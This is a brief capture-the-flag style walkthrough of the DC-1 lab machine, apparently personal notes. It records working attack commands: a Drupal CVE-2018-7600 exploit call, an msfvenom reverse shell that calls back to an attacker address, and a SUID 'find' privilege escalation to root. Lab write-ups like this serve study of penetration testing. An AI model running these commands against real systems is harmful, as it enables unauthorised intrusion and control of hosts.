# DC-1

![[Pasted image 20220509080859.png]]

## Port scan
```nmap

```

## Port 80: Drupal 7
![[Pasted image 20220509080908.png]]

Vulnerable to CVE-2018-7600

[exploit for drupal 7 < 7.57](https://github.com/pimps/CVE-2018-7600)
```bash
./drupa7-CVE-2018-7600.py -c whoami http://192.168.1.114:80/
```

![[Pasted image 20220509081008.png]]

check the architecture

![[Pasted image 20220509081128.png]]

generate a reverse shell with

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.112 LPORT=80 -f elf -o reverse.elf 
```

copy the payload over using python3 webserver and wget.

reverse shell

![[Pasted image 20220509081313.png]]

fix it

```python3
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

## Linpeas findings

credentials to the backend db of drupal

![[Pasted image 20220509081411.png]]

SUID set for `/usr/bin/find` exploitable with the following (sourced from [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid))

```bash
find . -exec /bin/sh \; -quit
```

got a root shell

![[Pasted image 20220509081532.png]]

There are 2 users in the db

![[Pasted image 20220509081713.png]]

Maybe I'll come back and try to recover their passwords someday.